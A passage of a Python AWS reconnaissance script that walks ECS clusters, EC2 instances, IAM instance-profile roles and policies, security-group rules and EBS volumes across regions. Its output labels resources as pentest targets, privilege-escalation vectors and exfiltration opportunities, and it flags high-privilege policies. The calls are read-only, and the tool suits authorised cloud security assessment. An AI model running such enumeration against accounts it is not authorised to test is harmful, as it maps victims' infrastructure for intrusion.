                        print(f"      {Fore.GREEN}Name: {container.get('name')}{Style.RESET_ALL}")
                        print(f"      {Fore.GREEN}Last Status: {container.get('lastStatus')}{Style.RESET_ALL}")
                        print(f"      {Fore.GREEN}Health Status: {container.get('healthStatus', 'N/A')}{Style.RESET_ALL}")
                        
                        # Network bindings (port mappings)
                        network_bindings = container.get('networkBindings', [])
                        if network_bindings:
                            print(f"      {Fore.YELLOW}Network Bindings:{Style.RESET_ALL}")
                            for binding in network_bindings:
                                print(f"        {Fore.GREEN}Host Port: {binding.get('hostPort')} -> Container Port: {binding.get('containerPort')} ({binding.get('protocol', 'tcp')}){Style.RESET_ALL}")
                        
                        # Network interfaces (for awsvpc mode)
                        network_interfaces = container.get('networkInterfaces', [])
                        if network_interfaces:
                            print(f"      {Fore.YELLOW}Network Interfaces:{Style.RESET_ALL}")
                            for interface in network_interfaces:
                                print(f"        {Fore.GREEN}Private IP: {interface.get('privateIpv4Address')}{Style.RESET_ALL}")
                                if interface.get('publicIpv4Address'):
                                    print(f"        {Fore.RED}Public IP: {interface.get('publicIpv4Address')}{Style.RESET_ALL}")
                
                # Task attachments (ENIs, etc.)
                attachments = task.get('attachments', [])
                if attachments:
                    print(f"    {Fore.CYAN}Attachments:{Style.RESET_ALL}")
                    for attachment in attachments:
                        print(f"      {Fore.GREEN}Type: {attachment.get('type')}{Style.RESET_ALL}")
                        print(f"      {Fore.GREEN}Status: {attachment.get('status')}{Style.RESET_ALL}")
                        
                        # ENI details
                        details = attachment.get('details', [])
                        for detail in details:
                            if detail.get('name') == 'networkInterfaceId':
                                print(f"      {Fore.GREEN}ENI ID: {detail.get('value')}{Style.RESET_ALL}")
                
                # Tags
                try:
                    tags_response = ecs_client.list_tags_for_resource(resourceArn=task.get('taskArn'))
                    tags = tags_response.get('tags', [])
                    if tags:
                        print(f"    {Fore.CYAN}Tags:{Style.RESET_ALL}")
                        for tag in tags:
                            print(f"      {Fore.GREEN}{tag.get('key')}: {tag.get('value')}{Style.RESET_ALL}")
                except Exception as e:
                    logger.debug(f"Error getting tags for task: {e}")
        
    except Exception as e:
        error_msg = f"Error analyzing ECS tasks in cluster {cluster_name}: {e}"
        logger.error(error_msg)
        print(f"{Fore.RED}❌ {error_msg}{Style.RESET_ALL}")

def analyze_container_instances(ecs_client, cluster_name, region):
    """Analyze container instances in an ECS cluster"""
    try:
        print(f"\n{Fore.BLUE}💻 Analyzing Container Instances in cluster {cluster_name}...{Style.RESET_ALL}")
        
        # List container instances
        instances_response = ecs_client.list_container_instances(cluster=cluster_name)
        instance_arns = instances_response.get('containerInstanceArns', [])
        
        if not instance_arns:
            print(f"{Fore.YELLOW}No container instances found in cluster {cluster_name}{Style.RESET_ALL}")
            return
        
        # Describe container instances
        instances_detail = ecs_client.describe_container_instances(cluster=cluster_name, containerInstances=instance_arns)
        instances = instances_detail.get('containerInstances', [])
        
        print(f"{Fore.GREEN}Found {len(instances)} container instances:{Style.RESET_ALL}")
        
        for instance in instances:
            print(f"\n{Fore.CYAN}  💻 Container Instance: {instance.get('containerInstanceArn', '').split('/')[-1]}{Style.RESET_ALL}")
            print(f"    {Fore.GREEN}EC2 Instance ID: {instance.get('ec2InstanceId')}{Style.RESET_ALL}")
            print(f"    {Fore.GREEN}Status: {instance.get('status')}{Style.RESET_ALL}")
            print(f"    {Fore.GREEN}Agent Connected: {instance.get('agentConnected')}{Style.RESET_ALL}")
            print(f"    {Fore.GREEN}Running Tasks: {instance.get('runningTasksCount', 0)}{Style.RESET_ALL}")
            print(f"    {Fore.GREEN}Pending Tasks: {instance.get('pendingTasksCount', 0)}{Style.RESET_ALL}")
            print(f"    {Fore.GREEN}Agent Version: {instance.get('versionInfo', {}).get('agentVersion', 'N/A')}{Style.RESET_ALL}")
            print(f"    {Fore.GREEN}Docker Version: {instance.get('versionInfo', {}).get('dockerVersion', 'N/A')}{Style.RESET_ALL}")
            
            # Resource information
            registered_resources = instance.get('registeredResources', [])
            remaining_resources = instance.get('remainingResources', [])
            
            if registered_resources or remaining_resources:
                print(f"    {Fore.CYAN}Resources:{Style.RESET_ALL}")
                
                # Create resource maps for easier comparison
                registered_map = {r.get('name'): r.get('integerValue', r.get('stringSetValue')) for r in registered_resources}
                remaining_map = {r.get('name'): r.get('integerValue', r.get('stringSetValue')) for r in remaining_resources}
                
                for resource_name in registered_map:
                    registered_val = registered_map.get(resource_name, 0)
                    remaining_val = remaining_map.get(resource_name, 0)
                    used_val = registered_val - remaining_val if isinstance(registered_val, int) and isinstance(remaining_val, int) else 'N/A'
                    
                    print(f"      {Fore.GREEN}{resource_name}: {used_val}/{registered_val} used{Style.RESET_ALL}")
            
            # Attributes
            attributes = instance.get('attributes', [])
            if attributes:
                print(f"    {Fore.CYAN}Attributes:{Style.RESET_ALL}")
                for attr in attributes:
                    print(f"      {Fore.GREEN}{attr.get('name')}: {attr.get('value', 'N/A')}{Style.RESET_ALL}")
            
            # Tags
            tags = instance.get('tags', [])
            if tags:
                print(f"    {Fore.CYAN}Tags:{Style.RESET_ALL}")
                for tag in tags:
                    print(f"      {Fore.GREEN}{tag.get('key')}: {tag.get('value')}{Style.RESET_ALL}")
        
    except Exception as e:
        error_msg = f"Error analyzing container instances in cluster {cluster_name}: {e}"
        logger.error(error_msg)
        print(f"{Fore.RED}❌ {error_msg}{Style.RESET_ALL}")

def analyze_ecs_clusters(session, current_region):
    """Comprehensive ECS clusters analysis"""
    print(f"\n{Fore.YELLOW}=== ECS Clusters Analysis ==={Style.RESET_ALL}")
    logger.info("Starting ECS clusters analysis")
    
    # Ask user about region scanning
    search_all_regions = input(f"{Fore.GREEN}Search ECS clusters in all regions? (y/n) [default: current region only]: {Style.RESET_ALL}").strip().lower()
    
    regions_to_scan = []
    if search_all_regions in ['y', 'yes']:
        print(f"{Fore.BLUE}Getting all available regions...{Style.RESET_ALL}")
        try:
            ec2_client = session.client('ec2', region_name=current_region)
            regions_response = ec2_client.describe_regions()
            regions_to_scan = [region['RegionName'] for region in regions_response['Regions']]
            print(f"{Fore.GREEN}Will scan {len(regions_to_scan)} regions: {', '.join(regions_to_scan)}{Style.RESET_ALL}")
            logger.info(f"Scanning ECS clusters in all {len(regions_to_scan)} regions")
        except Exception as e:
            print(f"{Fore.RED}❌ Error getting regions dynamically: {e}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}Using hardcoded region list...{Style.RESET_ALL}")
            # You'll need to define AWS_REGIONS or use a hardcoded list
            regions_to_scan = [
                'us-east-1', 'us-east-2', 'us-west-1', 'us-west-2',
                'eu-west-1', 'eu-west-2', 'eu-west-3', 'eu-central-1',
                'ap-southeast-1', 'ap-southeast-2', 'ap-northeast-1'
            ]
    else:
        regions_to_scan = [current_region]
        print(f"{Fore.CYAN}Scanning ECS clusters in current region: {current_region}{Style.RESET_ALL}")
        logger.info(f"Scanning ECS clusters in current region only: {current_region}")
    
    total_clusters_found = 0
    total_services_found = 0
    total_tasks_found = 0
    cluster_entries = []
    
    # Process each region
    for region in regions_to_scan:
        print(f"\n{Fore.MAGENTA}🌍 Scanning region: {region}{Style.RESET_ALL}")
        logger.info(f"Scanning ECS clusters in region: {region}")
        
        try:
            ecs_client = session.client("ecs", region_name=region)
            
            # List clusters in this region
            clusters_response = ecs_client.list_clusters()
            cluster_arns = clusters_response.get('clusterArns', [])
            
            if not cluster_arns:
                print(f"{Fore.YELLOW}No ECS clusters found in {region}{Style.RESET_ALL}")
                continue
            
            total_clusters_found += len(cluster_arns)
            print(f"{Fore.GREEN}Found {len(cluster_arns)} ECS clusters in {region}{Style.RESET_ALL}")
            
            # Analyze each cluster
            for cluster_arn in cluster_arns:
                cluster_name = cluster_arn.split('/')[-1]
                analyze_ecs_cluster(ecs_client, cluster_name, region)
                
                # Count services and tasks for summary
                try:
                    services_response = ecs_client.list_services(cluster=cluster_name)
                    service_count = len(services_response.get('serviceArns', []))
                    total_services_found += service_count

                    running_tasks = ecs_client.list_tasks(cluster=cluster_name, desiredStatus='RUNNING')
                    stopped_tasks = ecs_client.list_tasks(cluster=cluster_name, desiredStatus='STOPPED')
                    task_count = len(running_tasks.get('taskArns', [])) + len(stopped_tasks.get('taskArns', []))
                    total_tasks_found += task_count

                    cluster_entries.append({
                        "region": region,
                        "name": cluster_name,
                        "services": service_count,
                        "tasks": task_count,
                    })
                    if region not in output_data["metadata"]["regions_scanned"]:
                        output_data["metadata"]["regions_scanned"].append(region)
                except Exception as e:
                    logger.error(f"Error counting resources in cluster {cluster_name}: {e}")
            
        except Exception as e:
            error_msg = f"Error scanning ECS clusters in region {region}: {e}"
            logger.error(error_msg)
            print(f"{Fore.RED}❌ {error_msg}{Style.RESET_ALL}")
    
    # Final summary
    print(f"\n{Fore.GREEN}🌍 Multi-Region ECS Summary:{Style.RESET_ALL}")
    print(f"  {Fore.CYAN}Regions scanned: {len(regions_to_scan)}{Style.RESET_ALL}")
    print(f"  {Fore.CYAN}Total clusters found: {total_clusters_found}{Style.RESET_ALL}")
    print(f"  {Fore.CYAN}Total services found: {total_services_found}{Style.RESET_ALL}")
    print(f"  {Fore.CYAN}Total tasks found: {total_tasks_found}{Style.RESET_ALL}")
    
    logger.info(f"ECS analysis complete across {len(regions_to_scan)} regions: {total_clusters_found} clusters, {total_services_found} services, {total_tasks_found} tasks")

    output_data["ecs"]["clusters"].extend(cluster_entries)

def analyze_ec2_instances(session, current_region):
    """Comprehensive EC2 instance analysis for penetration testing"""
    print(f"\n{Fore.YELLOW}=== EC2 Instance Analysis ==={Style.RESET_ALL}")
    logger.info("Starting EC2 instance analysis")
    
    # Ask user about region scanning
    search_all_regions = input(f"{Fore.GREEN}Search EC2 instances in all regions? (y/n) [default: current region only]: {Style.RESET_ALL}").strip().lower()
    
    regions_to_scan = []
    if search_all_regions in ['y', 'yes']:
        print(f"{Fore.BLUE}Getting all available regions...{Style.RESET_ALL}")
        try:
            ec2_client = session.client('ec2', region_name=current_region)
            regions_response = ec2_client.describe_regions()
            regions_to_scan = [region['RegionName'] for region in regions_response['Regions']]
            print(f"{Fore.GREEN}Will scan {len(regions_to_scan)} regions: {', '.join(regions_to_scan)}{Style.RESET_ALL}")
            logger.info(f"Scanning EC2 instances in all {len(regions_to_scan)} regions")
        except Exception as e:
            print(f"{Fore.RED}❌ Error getting regions dynamically: {e}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}Falling back to hardcoded region list...{Style.RESET_ALL}")
            # Same hardcoded region list as your original code
            regions_to_scan = AWS_REGIONS
    else:
        regions_to_scan = [current_region]
        print(f"{Fore.CYAN}Scanning EC2 instances in current region: {current_region}{Style.RESET_ALL}")
        logger.info(f"Scanning EC2 instances in current region only: {current_region}")
    
    total_instances = 0
    total_running_instances = 0
    total_volumes = 0
    total_security_groups = 0
    
    # Process each region
    for region in regions_to_scan:
        print(f"\n{Fore.MAGENTA}🌍 Scanning region: {region}{Style.RESET_ALL}")
        logger.info(f"Scanning EC2 instances in region: {region}")
        
        try:
            ec2_client = session.client("ec2", region_name=region)
            region_instances, region_running, region_volumes, region_sgs = analyze_ec2_in_region(ec2_client, iam_client, region)
            total_instances += region_instances
            total_running_instances += region_running
            total_volumes += region_volumes
            total_security_groups += region_sgs
            
        except Exception as e:
            error_msg = f"Error scanning EC2 in region {region}: {e}"
            logger.error(error_msg)
            print(f"{Fore.RED}❌ {error_msg}{Style.RESET_ALL}")
    
    # Final summary
    print(f"\n{Fore.GREEN}🌍 Multi-Region EC2 Summary:{Style.RESET_ALL}")
    print(f"  {Fore.CYAN}Regions scanned: {len(regions_to_scan)}{Style.RESET_ALL}")
    print(f"  {Fore.CYAN}Total instances found: {total_instances}{Style.RESET_ALL}")
    print(f"  {Fore.GREEN}Running instances: {total_running_instances}{Style.RESET_ALL}")
    print(f"  {Fore.CYAN}Total EBS volumes: {total_volumes}{Style.RESET_ALL}")
    print(f"  {Fore.YELLOW}Unique security groups: {total_security_groups}{Style.RESET_ALL}")
    
    logger.info(f"EC2 analysis complete across {len(regions_to_scan)} regions: {total_instances} instances ({total_running_instances} running), {total_volumes} volumes, {total_security_groups} security groups")

def get_instance_profile_details(iam_client, profile_arn, instance_id):
    """Get detailed information about IAM instance profile and associated roles"""
    try:
        # Extract profile name from ARN
        profile_name = profile_arn.split('/')[-1]
        
        print(f"  {Fore.RED}Profile Name: {profile_name}{Style.RESET_ALL}")
        
        # Get instance profile details
        profile_response = iam_client.get_instance_profile(InstanceProfileName=profile_name)
        profile_info = profile_response['InstanceProfile']
        
        print(f"  {Fore.GREEN}Creation Date: {profile_info.get('CreateDate', 'N/A')}{Style.RESET_ALL}")
        print(f"  {Fore.GREEN}Path: {profile_info.get('Path', 'N/A')}{Style.RESET_ALL}")
        
        # Get associated roles
        roles = profile_info.get('Roles', [])
        if roles:
            print(f"\n  {Fore.RED}🎭 Associated IAM Roles ({len(roles)}):{Style.RESET_ALL}")
            
            for role in roles:
                role_name = role['RoleName']
                role_arn = role['Arn']
                
                print(f"\n    {Fore.RED}📋 Role: {role_name}{Style.RESET_ALL}")
                print(f"      {Fore.GREEN}Role ARN: {role_arn}{Style.RESET_ALL}")
                print(f"      {Fore.GREEN}Creation Date: {role.get('CreateDate', 'N/A')}{Style.RESET_ALL}")
                print(f"      {Fore.GREEN}Max Session Duration: {role.get('MaxSessionDuration', 'N/A')} seconds{Style.RESET_ALL}")
                
                # Get role's trust policy (who can assume this role)
                try:
                    trust_policy = role.get('AssumeRolePolicyDocument')
                    if trust_policy:
                        print(f"      {Fore.YELLOW}🔐 Trust Policy (Who can assume):{Style.RESET_ALL}")
                        # Parse trust policy to show principals
                        import json
                        import urllib.parse
                        
                        if isinstance(trust_policy, str):
                            trust_policy = json.loads(urllib.parse.unquote(trust_policy))
                        
                        statements = trust_policy.get('Statement', [])
                        for stmt in statements:
                            effect = stmt.get('Effect', 'Unknown')
                            action = stmt.get('Action', [])
                            principal = stmt.get('Principal', {})
                            
                            if effect == 'Allow' and 'sts:AssumeRole' in (action if isinstance(action, list) else [action]):
                                if isinstance(principal, dict):
                                    for principal_type, principal_values in principal.items():
                                        if isinstance(principal_values, list):
                                            for value in principal_values:
                                                print(f"        {Fore.CYAN}• {principal_type}: {value}{Style.RESET_ALL}")
                                        else:
                                            print(f"        {Fore.CYAN}• {principal_type}: {principal_values}{Style.RESET_ALL}")
                except Exception as e:
                    logger.debug(f"Error parsing trust policy for role {role_name}: {e}")
                
                # Get attached managed policies
                try:
                    attached_policies = iam_client.list_attached_role_policies(RoleName=role_name)
                    managed_policies = attached_policies.get('AttachedPolicies', [])
                    
                    if managed_policies:
                        print(f"      {Fore.RED}📜 Attached Managed Policies ({len(managed_policies)}):{Style.RESET_ALL}")
                        
                        for policy in managed_policies:
                            policy_name = policy['PolicyName']
                            policy_arn = policy['PolicyArn']
                            
                            print(f"        {Fore.RED}• {policy_name}{Style.RESET_ALL}")
                            print(f"          {Fore.GREEN}ARN: {policy_arn}{Style.RESET_ALL}")
                            
                            # Highlight dangerous AWS managed policies
                            dangerous_policies = [
                                'AdministratorAccess',
                                'PowerUserAccess',
                                'IAMFullAccess',
                                'AmazonS3FullAccess',
                                'AmazonEC2FullAccess',
                                'SecurityAudit'
                            ]
                            
                            if any(dangerous in policy_name for dangerous in dangerous_policies):
                                print(f"          {Fore.RED}🚨 HIGH PRIVILEGE POLICY - ESCALATION RISK{Style.RESET_ALL}")
                                logger.warning(f"Instance {instance_id} has high privilege policy: {policy_name}")
                            
                            # Get policy version and permissions for critical policies
                            try:
                                if 'aws:iam::aws:policy' in policy_arn:  # AWS managed policy
                                    policy_details = iam_client.get_policy(PolicyArn=policy_arn)
                                    default_version = policy_details['Policy']['DefaultVersionId']
                                    
                                    policy_version = iam_client.get_policy_version(
                                        PolicyArn=policy_arn,
                                        VersionId=default_version
                                    )
                                    
                                    policy_document = policy_version['PolicyVersion']['Document']
                                    
                                    # Show critical permissions
                                    statements = policy_document.get('Statement', [])
                                    critical_actions = []
                                    
                                    for stmt in statements:
                                        if stmt.get('Effect') == 'Allow':
                                            actions = stmt.get('Action', [])
                                            if isinstance(actions, str):
                                                actions = [actions]
                                            
                                            for action in actions:
                                                if any(dangerous_action in action.lower() for dangerous_action in 
                                                      ['*', 'admin', 'full', 'create', 'delete', 'put', 'attach', 'detach']):
                                                    critical_actions.append(action)
                                    
                                    if critical_actions[:5]:  # Show first 5 critical actions
                                        print(f"          {Fore.YELLOW}⚠️ Critical Actions: {', '.join(critical_actions[:5])}{Style.RESET_ALL}")
                                        if len(critical_actions) > 5:
                                            print(f"          {Fore.YELLOW}    ... and {len(critical_actions) - 5} more{Style.RESET_ALL}")
                                            
                            except Exception as e:
                                logger.debug(f"Error getting policy details for {policy_name}: {e}")
                    
                    # Get inline policies
                    inline_policies = iam_client.list_role_policies(RoleName=role_name)
                    inline_policy_names = inline_policies.get('PolicyNames', [])
                    
                    if inline_policy_names:
                        print(f"      {Fore.RED}📝 Inline Policies ({len(inline_policy_names)}):{Style.RESET_ALL}")
                        
                        for policy_name in inline_policy_names:
                            print(f"        {Fore.RED}• {policy_name}{Style.RESET_ALL}")
                            
                            try:
                                # Get inline policy document
                                policy_response = iam_client.get_role_policy(
                                    RoleName=role_name,
                                    PolicyName=policy_name
                                )
                                
                                policy_document = policy_response['PolicyDocument']
                                statements = policy_document.get('Statement', [])
                                
                                # Analyze permissions
                                dangerous_actions = []
                                resource_access = []
                                
                                for stmt in statements:
                                    if stmt.get('Effect') == 'Allow':
                                        actions = stmt.get('Action', [])
                                        resources = stmt.get('Resource', [])
                                        
                                        if isinstance(actions, str):
                                            actions = [actions]
                                        if isinstance(resources, str):
                                            resources = [resources]
                                        
                                        for action in actions:
                                            if '*' in action or any(danger in action.lower() for danger in 
                                                                  ['admin', 'full', 'create', 'delete', 'put', 'attach']):
                                                dangerous_actions.append(action)
                                        
                                        for resource in resources:
                                            if '*' in resource or 'arn:aws' in resource:
                                                resource_access.append(resource)
                                
                                if dangerous_actions:
                                    print(f"          {Fore.RED}🚨 Dangerous Actions: {', '.join(dangerous_actions[:3])}{Style.RESET_ALL}")
                                    if len(dangerous_actions) > 3:
                                        print(f"          {Fore.RED}    ... and {len(dangerous_actions) - 3} more{Style.RESET_ALL}")
                                
                                if resource_access:
                                    critical_resources = [r for r in resource_access if '*' in r]
                                    if critical_resources:
                                        print(f"          {Fore.YELLOW}⚠️ Wide Resource Access: {', '.join(critical_resources[:2])}{Style.RESET_ALL}")
                                        if len(critical_resources) > 2:
                                            print(f"          {Fore.YELLOW}    ... and {len(critical_resources) - 2} more{Style.RESET_ALL}")
                                            
                            except Exception as e:
                                logger.debug(f"Error getting inline policy {policy_name}: {e}")
                                
                except Exception as e:
                    logger.debug(f"Error getting role policies for {role_name}: {e}")
                
                # Show last activity if available
                try:
                    role_last_used = iam_client.get_role(RoleName=role_name)
                    last_used_info = role_last_used['Role'].get('RoleLastUsed', {})
                    
                    if last_used_info:
                        last_used_date = last_used_info.get('LastUsedDate')
                        last_used_region = last_used_info.get('Region')
                        
                        if last_used_date:
                            print(f"      {Fore.CYAN}🕐 Last Used: {last_used_date} in {last_used_region or 'Unknown region'}{Style.RESET_ALL}")
                        else:
                            print(f"      {Fore.YELLOW}🕐 Last Used: Never or > 400 days ago{Style.RESET_ALL}")
                            
                except Exception as e:
                    logger.debug(f"Error getting role last used info for {role_name}: {e}")
        
        else:
            print(f"  {Fore.YELLOW}⚠️ No roles attached to this instance profile{Style.RESET_ALL}")
            
    except Exception as e:
        logger.error(f"Error getting instance profile details: {e}")
        print(f"  {Fore.RED}❌ Error retrieving profile details: {e}{Style.RESET_ALL}")

def analyze_ec2_in_region(ec2_client, iam_client, region):
    """Analyze EC2 instances in a specific region"""
    try:
        if region not in output_data["metadata"]["regions_scanned"]:
            output_data["metadata"]["regions_scanned"].append(region)
        # Get all instances
        print(f"{Fore.BLUE}Discovering EC2 instances in {region}...{Style.RESET_ALL}")
        paginator = ec2_client.get_paginator('describe_instances')
        
        instances = []
        for page in paginator.paginate():
            for reservation in page['Reservations']:
                instances.extend(reservation['Instances'])
        
        if not instances:
            print(f"{Fore.YELLOW}No EC2 instances found in {region}.{Style.RESET_ALL}")
            logger.info(f"No EC2 instances found in {region}")
            return 0, 0, 0, 0
        
        print(f"{Fore.GREEN}Found {len(instances)} EC2 instances in {region}{Style.RESET_ALL}")
        logger.info(f"Found {len(instances)} EC2 instances in {region}")
        
        running_instances = 0
        total_volumes = 0
        security_groups_seen = set()
        
        # Process each instance
        for i, instance in enumerate(instances, 1):
            instance_id = instance['InstanceId']
            instance_state = instance['State']['Name']
            
            print(f"\n{Fore.CYAN}{'='*80}{Style.RESET_ALL}")
            print(f"{Fore.CYAN}🖥️ Instance {i}/{len(instances)}: {instance_id}{Style.RESET_ALL}")
            print(f"{Fore.CYAN}{'='*80}{Style.RESET_ALL}")
            
            # Basic instance information
            print(f"{Fore.MAGENTA}📋 Basic Information:{Style.RESET_ALL}")
            print(f"  {Fore.GREEN}Instance ID: {instance_id}{Style.RESET_ALL}")
            print(f"  {Fore.GREEN}State: {instance_state}{Style.RESET_ALL}")
            
            if instance_state == 'running':
                running_instances += 1
                print(f"  {Fore.RED}🔴 RUNNING - ACTIVE TARGET{Style.RESET_ALL}")
            
            print(f"  {Fore.GREEN}Instance Type: {instance.get('InstanceType', 'N/A')}{Style.RESET_ALL}")
            print(f"  {Fore.GREEN}AMI ID: {instance.get('ImageId', 'N/A')}{Style.RESET_ALL}")
            print(f"  {Fore.GREEN}Key Pair: {instance.get('KeyName', 'None')}{Style.RESET_ALL}")
            print(f"  {Fore.GREEN}Launch Time: {instance.get('LaunchTime', 'N/A')}{Style.RESET_ALL}")
            print(f"  {Fore.GREEN}Platform: {instance.get('Platform', 'Linux/Unix')}{Style.RESET_ALL}")
            print(f"  {Fore.GREEN}Architecture: {instance.get('Architecture', 'N/A')}{Style.RESET_ALL}")
            print(f"  {Fore.GREEN}VPC ID: {instance.get('VpcId', 'Classic EC2')}{Style.RESET_ALL}")
            print(f"  {Fore.GREEN}Subnet ID: {instance.get('SubnetId', 'N/A')}{Style.RESET_ALL}")
            print(f"  {Fore.GREEN}Availability Zone: {instance.get('Placement', {}).get('AvailabilityZone', 'N/A')}{Style.RESET_ALL}")
            
            # Network information (CRITICAL for pentesting)
            print(f"\n{Fore.RED}🌐 Network Information (PENTESTING TARGETS):{Style.RESET_ALL}")
            
            # Private IP
            private_ip = instance.get('PrivateIpAddress')
            if private_ip:
                print(f"  {Fore.RED}Private IP: {private_ip}{Style.RESET_ALL}")
                logger.warning(f"Instance {instance_id} private IP: {private_ip}")
            
            # Public IP
            public_ip = instance.get('PublicIpAddress')
            if public_ip:
                print(f"  {Fore.RED}🎯 PUBLIC IP: {public_ip} (EXTERNAL TARGET){Style.RESET_ALL}")
                logger.warning(f"Instance {instance_id} public IP: {public_ip}")
            else:
                print(f"  {Fore.YELLOW}Public IP: None (Internal only){Style.RESET_ALL}")
            
            # Private DNS
            private_dns = instance.get('PrivateDnsName')
            if private_dns:
                print(f"  {Fore.CYAN}Private DNS: {private_dns}{Style.RESET_ALL}")
            
            # Public DNS
            public_dns = instance.get('PublicDnsName')
            if public_dns:
                print(f"  {Fore.RED}🎯 Public DNS: {public_dns}{Style.RESET_ALL}")
            
            # Network interfaces
            network_interfaces = instance.get('NetworkInterfaces', [])
            if network_interfaces:
                print(f"\n{Fore.BLUE}🔌 Network Interfaces ({len(network_interfaces)}):{Style.RESET_ALL}")
                for ni in network_interfaces:
                    ni_id = ni.get('NetworkInterfaceId')
                    ni_private_ip = ni.get('PrivateIpAddress')
                    ni_public_ip = ni.get('Association', {}).get('PublicIp')
                    
                    print(f"    {Fore.CYAN}Interface: {ni_id}{Style.RESET_ALL}")
                    print(f"      {Fore.GREEN}Private IP: {ni_private_ip}{Style.RESET_ALL}")
                    if ni_public_ip:
                        print(f"      {Fore.RED}🎯 Public IP: {ni_public_ip}{Style.RESET_ALL}")
                    
                    # Secondary private IPs
                    secondary_ips = ni.get('PrivateIpAddresses', [])
                    if len(secondary_ips) > 1:
                        print(f"      {Fore.YELLOW}Secondary IPs:{Style.RESET_ALL}")
                        for sec_ip in secondary_ips[1:]:  # Skip primary
                            print(f"        {Fore.YELLOW}• {sec_ip.get('PrivateIpAddress')}{Style.RESET_ALL}")
            
            # IAM Instance Profile (ENHANCED - privilege escalation opportunities)
            iam_instance_profile = instance.get('IamInstanceProfile')
            if iam_instance_profile:
                profile_arn = iam_instance_profile.get('Arn', 'N/A')
                print(f"\n{Fore.RED}🎭 IAM Instance Profile (PRIVILEGE ESCALATION VECTOR):{Style.RESET_ALL}")
                print(f"  {Fore.RED}Profile ARN: {profile_arn}{Style.RESET_ALL}")
                logger.warning(f"Instance {instance_id} has IAM profile: {profile_arn}")
                
                # Get detailed profile and role information
                get_instance_profile_details(iam_client, profile_arn, instance_id)
            else:
                print(f"\n{Fore.YELLOW}🎭 IAM Instance Profile: None (No AWS API access from instance){Style.RESET_ALL}")
            
            # Security Groups (CRITICAL for attack surface analysis)
            security_groups = instance.get('SecurityGroups', [])
            if security_groups:
                print(f"\n{Fore.RED}🛡️ Security Groups (ATTACK SURFACE):{Style.RESET_ALL}")
                for sg in security_groups:
                    sg_id = sg['GroupId']
                    sg_name = sg['GroupName']
                    security_groups_seen.add(sg_id)
                    print(f"  {Fore.RED}• {sg_name} ({sg_id}){Style.RESET_ALL}")
                
                # Get detailed security group rules
                try:
                    sg_details = ec2_client.describe_security_groups(
                        GroupIds=[sg['GroupId'] for sg in security_groups]
                    )
                    
                    for sg_detail in sg_details['SecurityGroups']:
                        sg_id = sg_detail['GroupId']
                        sg_name = sg_detail['GroupName']
                        
                        print(f"\n    {Fore.YELLOW}🔍 {sg_name} ({sg_id}) Rules:{Style.RESET_ALL}")
                        
                        # Inbound rules
                        inbound_rules = sg_detail.get('IpPermissions', [])
                        if inbound_rules:
                            print(f"      {Fore.RED}📥 Inbound (POTENTIAL ENTRY POINTS):{Style.RESET_ALL}")
                            for rule in inbound_rules:
                                protocol = rule.get('IpProtocol', 'Unknown')
                                from_port = rule.get('FromPort', 'All')
                                to_port = rule.get('ToPort', 'All')
                                
                                port_info = f"{from_port}" if from_port == to_port else f"{from_port}-{to_port}"
                                if from_port == 'All':
                                    port_info = "All Ports"
                                
                                # Check sources
                                ip_ranges = rule.get('IpRanges', [])
                                for ip_range in ip_ranges:
                                    cidr = ip_range['CidrIp']
                                    description = ip_range.get('Description', '')
                                    if cidr == '0.0.0.0/0':
                                        print(f"        {Fore.RED}🚨 {protocol.upper()}:{port_info} <- 0.0.0.0/0 (INTERNET) {description}{Style.RESET_ALL}")
                                    else:
                                        print(f"        {Fore.YELLOW}• {protocol.upper()}:{port_info} <- {cidr} {description}{Style.RESET_ALL}")
                                
                                # Referenced security groups
                                user_id_group_pairs = rule.get('UserIdGroupPairs', [])
                                for group_pair in user_id_group_pairs:
                                    ref_sg = group_pair.get('GroupId', 'Unknown')
                                    print(f"        {Fore.CYAN}• {protocol.upper()}:{port_info} <- SG:{ref_sg}{Style.RESET_ALL}")
                        
                        # Outbound rules
                        outbound_rules = sg_detail.get('IpPermissionsEgress', [])
                        if outbound_rules:
                            print(f"      {Fore.BLUE}📤 Outbound:{Style.RESET_ALL}")
                            for rule in outbound_rules[:3]:  # Show first 3 to avoid clutter
                                protocol = rule.get('IpProtocol', 'Unknown')
                                from_port = rule.get('FromPort', 'All')
                                to_port = rule.get('ToPort', 'All')
                                
                                port_info = f"{from_port}" if from_port == to_port else f"{from_port}-{to_port}"
                                if from_port == 'All':
                                    port_info = "All Ports"
                                
                                ip_ranges = rule.get('IpRanges', [])
                                for ip_range in ip_ranges[:2]:  # Limit output
                                    cidr = ip_range['CidrIp']
                                    if cidr == '0.0.0.0/0':
                                        print(f"        {Fore.BLUE}• {protocol.upper()}:{port_info} -> 0.0.0.0/0 (INTERNET){Style.RESET_ALL}")
                                    else:
                                        print(f"        {Fore.CYAN}• {protocol.upper()}:{port_info} -> {cidr}{Style.RESET_ALL}")
                            
                            if len(outbound_rules) > 3:
                                print(f"        {Fore.YELLOW}... and {len(outbound_rules) - 3} more outbound rules{Style.RESET_ALL}")
                
                except Exception as e:
                    logger.error(f"Error getting security group details: {e}")
            
            # EBS Volumes (for data exfiltration opportunities)
            block_devices = instance.get('BlockDeviceMappings', [])
            if block_devices:
                print(f"\n{Fore.BLUE}💾 EBS Volumes (DATA STORAGE):{Style.RESET_ALL}")
                total_volumes += len(block_devices)
                
                for bd in block_devices:
                    device_name = bd.get('DeviceName', 'Unknown')
                    ebs = bd.get('Ebs', {})
                    volume_id = ebs.get('VolumeId', 'N/A')
                    
                    print(f"  {Fore.CYAN}Device: {device_name}{Style.RESET_ALL}")
                    print(f"    {Fore.GREEN}Volume ID: {volume_id}{Style.RESET_ALL}")
                    print(f"    {Fore.GREEN}Delete on Termination: {ebs.get('DeleteOnTermination', 'N/A')}{Style.RESET_ALL}")
                    
                    # Get volume details
                    try:
                        if volume_id != 'N/A':
                            volume_details = ec2_client.describe_volumes(VolumeIds=[volume_id])
                            for volume in volume_details['Volumes']:
                                size = volume.get('Size', 'Unknown')
                                volume_type = volume.get('VolumeType', 'Unknown')
                                encrypted = volume.get('Encrypted', False)
                                
                                print(f"    {Fore.GREEN}Size: {size} GB{Style.RESET_ALL}")
                                print(f"    {Fore.GREEN}Type: {volume_type}{Style.RESET_ALL}")
                                
                                if encrypted:
                                    print(f"    {Fore.YELLOW}🔐 Encrypted: Yes{Style.RESET_ALL}")
                                else:
                                    print(f"    {Fore.RED}🔓 Encrypted: No (UNPROTECTED DATA){Style.RESET_ALL}")
                                    logger.warning(f"Unencrypted volume {volume_id} on instance {instance_id}")
                                
                                # Snapshots
